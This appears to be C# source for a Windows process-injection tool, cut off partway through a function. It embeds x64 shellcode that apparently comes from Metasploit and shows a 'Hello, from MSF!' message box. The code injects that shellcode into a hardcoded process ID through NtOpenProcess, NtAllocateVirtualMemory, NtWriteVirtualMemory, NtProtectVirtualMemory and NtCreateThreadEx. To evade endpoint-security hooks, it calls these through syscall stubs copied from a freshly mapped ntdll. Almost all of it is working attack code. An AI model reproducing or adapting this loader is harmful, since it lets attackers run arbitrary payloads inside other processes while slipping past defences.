using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System;
using System.IO;

public class Program
{
    public static uint MEM_COMMIT = 0x1000;
    public static uint MEM_RESERVE = 0x2000;
    public static uint MEM_RESET = 0x80000;
    public static uint MEM_RESET_UNDO = 0x1000000;
    public static uint MEM_LARGE_PAGES = 0x20000000;
    public static uint MEM_PHYSICAL = 0x400000;
    public static uint MEM_TOP_DOWN = 0x100000;
    public static uint MEM_WRITE_WATCH = 0x200000;
    public static uint MEM_COALESCE_PLACEHOLDERS = 0x1;
    public static uint MEM_PRESERVE_PLACEHOLDER = 0x2;
    public static uint MEM_DECOMMIT = 0x4000;
    public static uint MEM_RELEASE = 0x8000;

    public const UInt32 PAGE_NOACCESS = 0x01;
    public const UInt32 PAGE_READONLY = 0x02;
    public const UInt32 PAGE_READWRITE = 0x04;
    public const UInt32 PAGE_WRITECOPY = 0x08;
    public const UInt32 PAGE_EXECUTE = 0x10;
    public const UInt32 PAGE_EXECUTE_READ = 0x20;
    public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
    public const UInt32 PAGE_GUARD = 0x100;
    public const UInt32 PAGE_NOCACHE = 0x200;
    public const UInt32 PAGE_WRITECOMBINE = 0x400;
    public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
    public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;

    static readonly byte[] _shellcode = new byte[323] 
    {
        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
        0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
        0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
        0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
        0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 
    };

    
    public static void Main()
    {
        //NtOpenProcess
        int pid = 5152;
        IntPtr stub = GetSyscallStub("NtOpenProcess");
        myNtOpenProcess ntOpenProcess = (myNtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(myNtOpenProcess));
        IntPtr hProcess = IntPtr.Zero;
        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
        CLIENT_ID ci = new CLIENT_ID();
        {
            ci.UniqueProcess = (IntPtr)pid;
            ci.UniqueThread = IntPtr.Zero;
        }
        NTSTATUS result = ntOpenProcess(ref hProcess, ProcessAccessFlags.PROCESS_ALL_ACCESS, ref oa, ref ci);
        //Console.WriteLine(result);

        //NtAllocateVm
        stub = GetSyscallStub("NtAllocateVirtualMemory");
        myNtAllocateVirtualMemory ntAllocateVirtualMemory = (myNtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(myNtAllocateVirtualMemory));
        IntPtr allocatedMem = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)_shellcode.Length;
        result = ntAllocateVirtualMemory(hProcess, ref allocatedMem, IntPtr.Zero, ref regionSize, 0x1000 | 0x2000, 0x04);
        //Console.WriteLine(result);

        //NtWriteVm
        stub = GetSyscallStub("NtWriteVirtualMemory");
        myNtWriteVirtualMemory ntWriteVirtualMemory = (myNtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(myNtWriteVirtualMemory));
        var buffer = Marshal.AllocHGlobal(_shellcode.Length);
        Marshal.Copy(_shellcode, 0, buffer, _shellcode.Length);
        uint bytesWritten = 0;
        result = ntWriteVirtualMemory(hProcess, allocatedMem, buffer, (uint)_shellcode.Length, ref bytesWritten);
        //Console.WriteLine(result);

        //NtProtectVm
        stub = GetSyscallStub("NtProtectVirtualMemory");
        myNtProtectVirtualMemory ntProtectVirtualMemory = (myNtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(myNtProtectVirtualMemory));
        uint oldProtect = 0;
        result = ntProtectVirtualMemory(hProcess, ref allocatedMem, ref regionSize, 0x20, ref oldProtect);
        //Console.WriteLine(result);

        //NtCreateThreadEx
        stub = GetSyscallStub("NtCreateThreadEx");
        myNtCreateThreadEx ntCreateThreadEx = (myNtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(myNtCreateThreadEx));
        IntPtr hThread = IntPtr.Zero;
        result = ntCreateThreadEx(out hThread, ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, allocatedMem, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        //Console.WriteLine(result);
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS myNtOpenProcess(
                ref IntPtr ProcessHandle,
                ProcessAccessFlags DesiredAccess,
                ref OBJECT_ATTRIBUTES ObjectAttributes,
                ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS myNtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref IntPtr RegionSize,
                UInt32 AllocationType,
                UInt32 Protect);
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS myNtWriteVirtualMemory(
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                IntPtr Buffer,
                UInt32 BufferLength,
                ref UInt32 BytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS myNtProtectVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                ref IntPtr RegionSize,
                UInt32 NewProtect,
                ref UInt32 OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate NTSTATUS myNtCreateThreadEx(
                out IntPtr threadHandle,
                ACCESS_MASK desiredAccess,
                IntPtr objectAttributes,
                IntPtr processHandle,
                IntPtr startAddress,
                IntPtr parameter,
                bool createSuspended,
                int stackZeroBits,
                int sizeOfStack,
                int maximumStackSize,
                IntPtr attributeList);


    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct OBJECT_ATTRIBUTES
    {
        public Int32 Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName; // -> UNICODE_STRING
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    }

    public static IntPtr GetSyscallStub(string FunctionName)
    {
        // Verify process & architecture
        bool isWOW64 = NtQueryInformationProcessWow64Information((IntPtr)(-1));
        if (IntPtr.Size == 4 && isWOW64)
        {
            throw new InvalidOperationException("Generating Syscall stubs is not supported for WOW64.");
        }
        
        // Find the path for ntdll by looking at the currently loaded module
        string NtdllPath = string.Empty;
        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule Mod in ProcModules)
        {
            if (Mod.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase))
            {
                NtdllPath = Mod.FileName;
            }
        }
        // Alloc module into memory for parsing
        IntPtr pModule = AllocateFileToMemory(NtdllPath);

        // Fetch PE meta data
        PE_META_DATA PEINFO = GetPeMetaData(pModule);

        // Alloc PE image memory -> RW
        IntPtr BaseAddress = IntPtr.Zero;
        IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
        UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;

        IntPtr pImage = NtAllocateVirtualMemory(
            (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        // Write PE header to memory
        UInt32 BytesWritten = NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);

        // Write sections to memory
        foreach (IMAGE_SECTION_HEADER ish in PEINFO.Sections)
        {
            // Calculate offsets
            IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
            IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);

            // Write data
            BytesWritten = NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
            if (BytesWritten != ish.SizeOfRawData)
            {
                throw new InvalidOperationException("Failed to write to memory.");
            }
        }

        // Get Ptr to function
        IntPtr pFunc = GetExportAddress(pImage, FunctionName);
        if (pFunc == IntPtr.Zero)
        {
            throw new InvalidOperationException("Failed to resolve ntdll export.");
        }

        // Alloc memory for call stub
        BaseAddress = IntPtr.Zero;
        RegionSize = (IntPtr)0x50;
        IntPtr pCallStub = NtAllocateVirtualMemory(
            (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        // Write call stub
        BytesWritten = NtWriteVirtualMemory((IntPtr)(-1), pCallStub, pFunc, 0x50);
        if (BytesWritten != 0x50)
        {
            throw new InvalidOperationException("Failed to write to memory.");
        }

        // Change call stub permissions
        NtProtectVirtualMemory((IntPtr)(-1), ref pCallStub, ref RegionSize, PAGE_EXECUTE_READ);

        // Free temporary allocations
        Marshal.FreeHGlobal(pModule);
        RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;

        NtFreeVirtualMemory((IntPtr)(-1), ref pImage, ref RegionSize, MEM_RELEASE);

        return pCallStub;
    }
    public static IntPtr AllocateFileToMemory(string FilePath)
    {
        if (!File.Exists(FilePath))
        {
            throw new InvalidOperationException("Filepath not found.");
        }

        byte[] bFile = File.ReadAllBytes(FilePath);
        return AllocateBytesToMemory(bFile);
    }
    public static IntPtr AllocateBytesToMemory(byte[] FileByteArray)
    {
        IntPtr pFile = Marshal.AllocHGlobal(FileByteArray.Length);
        Marshal.Copy(FileByteArray, 0, pFile, FileByteArray.Length);
        return pFile;
    }

    public static UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength)
    {
        // Craft an array for the arguments
        UInt32 BytesWritten = 0;
        object[] funcargs =
        {
                    ProcessHandle, BaseAddress, Buffer, BufferLength, BytesWritten
                };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(DELEGATES.NtWriteVirtualMemory), ref funcargs);
        if (retValue != NTSTATUS.Success)
        {
            throw new InvalidOperationException("Failed to write memory, " + retValue);
        }

        BytesWritten = (UInt32)funcargs[4];
        return BytesWritten;
    }
    public static UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect)
    {
        // Craft an array for the arguments
        UInt32 OldProtect = 0;
        object[] funcargs =
        {
                    ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect
                };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(DELEGATES.NtProtectVirtualMemory), ref funcargs);
        if (retValue != NTSTATUS.Success)
        {
            throw new InvalidOperationException("Failed to change memory protection, " + retValue);
        }

        OldProtect = (UInt32)funcargs[4];
        return OldProtect;
    }

    public static IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect)
    {
        // Craft an array for the arguments
        object[] funcargs =
        {
                    ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect
                };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(DELEGATES.NtAllocateVirtualMemory), ref funcargs);
        if (retValue == NTSTATUS.AccessDenied)
        {
            // STATUS_ACCESS_DENIED
            throw new UnauthorizedAccessException("Access is denied.");
        }
        if (retValue == NTSTATUS.AlreadyCommitted)
        {
            // STATUS_ALREADY_COMMITTED
            throw new InvalidOperationException("The specified address range is already committed.");
        }
        if (retValue == NTSTATUS.CommitmentLimit)
        {
            // STATUS_COMMITMENT_LIMIT
            throw new InvalidOperationException("Your system is low on virtual memory.");
        }
        if (retValue == NTSTATUS.ConflictingAddresses)
        {
            // STATUS_CONFLICTING_ADDRESSES
            throw new InvalidOperationException("The specified address range conflicts with the address space.");
        }
        if (retValue == NTSTATUS.InsufficientResources)
        {
            // STATUS_INSUFFICIENT_RESOURCES
            throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
        }
        if (retValue == NTSTATUS.InvalidHandle)
        {
            // STATUS_INVALID_HANDLE
            throw new InvalidOperationException("An invalid HANDLE was specified.");
        }
        if (retValue == NTSTATUS.InvalidPageProtection)
        {
            // STATUS_INVALID_PAGE_PROTECTION
            throw new InvalidOperationException("The specified page protection was not valid.");
        }
        if (retValue == NTSTATUS.NoMemory)
        {
            // STATUS_NO_MEMORY
            throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
        }
        if (retValue == NTSTATUS.ObjectTypeMismatch)
        {
            // STATUS_OBJECT_TYPE_MISMATCH
            throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
        }
        if (retValue != NTSTATUS.Success)
        {
            // STATUS_PROCESS_IS_TERMINATING == 0xC000010A
            throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
        }

        BaseAddress = (IntPtr)funcargs[1];
        return BaseAddress;
    }

    public static PE_META_DATA GetPeMetaData(IntPtr pModule)
    {
        PE_META_DATA PeMetaData = new PE_META_DATA();
        try
        {
            UInt32 e_lfanew = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + 0x3c));
            PeMetaData.Pe = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + e_lfanew));
            // Validate PE signature
            if (PeMetaData.Pe != 0x4550)
            {
                throw new InvalidOperationException("Invalid PE signature.");
            }
            PeMetaData.ImageFileHeader = (IMAGE_FILE_HEADER)Marshal.PtrToStructure((IntPtr)((UInt64)pModule + e_lfanew + 0x4), typeof(IMAGE_FILE_HEADER));
            IntPtr OptHeader = (IntPtr)((UInt64)pModule + e_lfanew + 0x18);
            UInt16 PEArch = (UInt16)Marshal.ReadInt16(OptHeader);
            // Validate PE arch
            if (PEArch == 0x010b) // Image is x32
            {
                PeMetaData.Is32Bit = true;
                PeMetaData.OptHeader32 = (IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(OptHeader, typeof(IMAGE_OPTIONAL_HEADER32));
            }
            else if (PEArch == 0x020b) // Image is x64
            {
                PeMetaData.Is32Bit = false;
                PeMetaData.OptHeader64 = (IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(OptHeader, typeof(IMAGE_OPTIONAL_HEADER64));
            }
            else
            {
                throw new InvalidOperationException("Invalid magic value (PE32/PE32+).");
            }
            // Read sections
            IMAGE_SECTION_HEADER[] SectionArray = new IMAGE_SECTION_HEADER[PeMetaData.ImageFileHeader.NumberOfSections];
            for (int i = 0; i < PeMetaData.ImageFileHeader.NumberOfSections; i++)
            {
                IntPtr SectionPtr = (IntPtr)((UInt64)OptHeader + PeMetaData.ImageFileHeader.SizeOfOptionalHeader + (UInt32)(i * 0x28));
                SectionArray[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(SectionPtr, typeof(IMAGE_SECTION_HEADER));
            }
            PeMetaData.Sections = SectionArray;
        }
        catch
        {
            throw new InvalidOperationException("Invalid module base specified.");
        }
        return PeMetaData;
    }

    public static bool NtQueryInformationProcessWow64Information(IntPtr hProcess)
    {
        NTSTATUS retValue = NtQueryInformationProcess(hProcess, PROCESSINFOCLASS.ProcessWow64Information, out IntPtr pProcInfo);

        if (Marshal.ReadIntPtr(pProcInfo) == IntPtr.Zero)
        {
            return false;
        }
        return true;
    }

    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters, bool CanLoadFromDisk = false, bool ResolveForwards = true)
    {
    var pFunction = GetLibraryAddress(DLLName, FunctionName, CanLoadFromDisk, ResolveForwards);
    return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
    }
    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = true)
    {
        var hModule = GetLoadedModuleAddress(DLLName);
        if (hModule == IntPtr.Zero && CanLoadFromDisk)
        {
            hModule = LoadModuleFromDisk(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
            }
        }
        else if (hModule == IntPtr.Zero)
        {
            throw new DllNotFoundException(DLLName + ", Dll was not found.");
        }

        return GetExportAddress(hModule, FunctionName, ResolveForwards);
    }
    private static void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
    {
        object[] funcargs = { DestinationString, SourceString };
        DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
        DestinationString = (UNICODE_STRING)funcargs[0];
    }
    private static uint LdrLoadDll(IntPtr PathToFile, uint dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
    {
        object[] funcargs = { PathToFile, dwFlags, ModuleFileName, ModuleHandle };
        var retValue = (uint)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);
        ModuleHandle = (IntPtr)funcargs[3];

        return retValue;
    }

    public static IntPtr LoadModuleFromDisk(string DLLPath)
    {
        var uModuleName = new UNICODE_STRING();
        RtlInitUnicodeString(ref uModuleName, DLLPath);

        var hModule = IntPtr.Zero;
        var CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);

        return hModule;
    }
    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = true)
    {
        var FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            var PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            var OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            var OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            var Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            long pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            var ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            var OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            var NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            var NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            var FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            var NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            var OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Get the VAs of the name table's beginning and end.
            var NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
            var NamesFinal = NamesBegin + NumberOfNames * 4;

            // Loop the array of export name RVA's
            for (var i = 0; i < NumberOfNames; i++)
            {
                var FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));

                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {

                    var FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    var FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);

                    if (ResolveForwards == true)
                        // If the export address points to a forward, get the address
                        FunctionPtr = GetForwardAddress(FunctionPtr);

                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero)
        {
            // Export not found
            throw new MissingMethodException(ExportName + ", export not found.");
        }
        return FunctionPtr;
    }
    private static IntPtr GetForwardAddress(IntPtr ExportAddress, bool CanLoadFromDisk = false)
    {
        var FunctionPtr = ExportAddress;
        try
        {
            // Assume it is a forward. If it is not, we will get an error
            var ForwardNames = Marshal.PtrToStringAnsi(FunctionPtr);
            var values = ForwardNames.Split('.');

            if (values.Length > 1)
            {
                var ForwardModuleName = values[0];
                var ForwardExportName = values[1];

                // Check if it is an API Set mapping
                var ApiSet = GetApiSetMapping();
                var LookupKey = ForwardModuleName.Substring(0, ForwardModuleName.Length - 2) + ".dll";
                if (ApiSet.ContainsKey(LookupKey))
                    ForwardModuleName = ApiSet[LookupKey];
                else
                    ForwardModuleName = ForwardModuleName + ".dll";

                var hModule = GetPebLdrModuleEntry(ForwardModuleName);
                if (hModule == IntPtr.Zero && CanLoadFromDisk == true)
                    hModule = LoadModuleFromDisk(ForwardModuleName);
                if (hModule != IntPtr.Zero)
                {
                    FunctionPtr = GetExportAddress(hModule, ForwardExportName);
                }
            }
        }
        catch
        {
            // Do nothing, it was not a forward
        }
        return FunctionPtr;
    }
    public static void RtlZeroMemory(IntPtr Destination, int Length)
    {
        // Craft an array for the arguments
        object[] funcargs =
        {
                Destination, Length
            };

        DynamicAPIInvoke(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
    }

    public static NTSTATUS NtQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
    {
        int processInformationLength;
        UInt32 RetLen = 0;

        switch (processInfoClass)
        {
            case PROCESSINFOCLASS.ProcessWow64Information:
                pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
                RtlZeroMemory(pProcInfo, IntPtr.Size);
                processInformationLength = IntPtr.Size;
                break;
            case PROCESSINFOCLASS.ProcessBasicInformation:
                PROCESS_BASIC_INFORMATION PBI = new PROCESS_BASIC_INFORMATION();
                pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
                RtlZeroMemory(pProcInfo, Marshal.SizeOf(PBI));
                Marshal.StructureToPtr(PBI, pProcInfo, true);
                processInformationLength = Marshal.SizeOf(PBI);
                break;
            default:
                throw new InvalidOperationException("Invalid ProcessInfoClass: {processInfoClass}");
        }

        object[] funcargs =
        {
                hProcess, processInfoClass, pProcInfo, processInformationLength, RetLen
            };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref funcargs);

        // Update the modified variables
        pProcInfo = (IntPtr)funcargs[2];

        return retValue;
    }
    private static PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
    {
        var retValue = NtQueryInformationProcess(hProcess, PROCESSINFOCLASS.ProcessBasicInformation, out var pProcInfo);
        return (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(PROCESS_BASIC_INFORMATION));
    }
    private static Dictionary<string, string> GetApiSetMapping()
    {
        var pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));
        var ApiSetMapOffset = IntPtr.Size == 4 ? (uint)0x38 : 0x68;

        // Create mapping dictionary
        var ApiSetDict = new Dictionary<string, string>();

        var pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((ulong)pbi.PebBaseAddress + ApiSetMapOffset));
        var Namespace = (ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(ApiSetNamespace));
        for (var i = 0; i < Namespace.Count; i++)
        {
            var SetEntry = new ApiSetNamespaceEntry();
            var pSetEntry = (IntPtr)((ulong)pApiSetNamespace + (ulong)Namespace.EntryOffset + (ulong)(i * Marshal.SizeOf(SetEntry)));
            SetEntry = (ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(ApiSetNamespaceEntry));

            var ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.NameOffset), SetEntry.NameLength / 2);
            var ApiSetEntryKey = ApiSetEntryName.Substring(0, ApiSetEntryName.Length - 2) + ".dll"; // Remove the patch number and add .dll

            var SetValue = new ApiSetValueEntry();

            var pSetValue = IntPtr.Zero;

            // If there is only one host, then use it
            if (SetEntry.ValueLength == 1)
                pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)SetEntry.ValueOffset);
